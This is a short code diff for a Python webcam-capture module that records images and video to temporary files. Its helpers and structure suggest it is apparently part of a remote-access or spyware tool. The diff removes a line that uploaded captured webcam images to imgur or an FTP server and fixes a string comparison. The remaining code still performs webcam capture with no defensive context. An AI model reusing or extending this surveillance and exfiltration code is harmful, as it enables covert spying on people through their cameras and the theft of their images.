@@ -39,14 +39,13 @@ def image(*args, **kwargs):
         if not r:
             util.log(f)
             return "Unable to access webcam"
-        png = util.png(f)
-        return util.imgur(png) if 'ftp' not in args else util.ftp(png, filetype='.png')
+        return util.png(f)
     except Exception as e:
         return '{} error: {}'.format(image.func_name, str(e))
 
 def video(*args, **kwargs):
     try:
-        fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
+        fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name == 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
         fourcc  = cv2.VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else cv2.VideoWriter_fourcc(*'XVID')
         output  = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
         length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
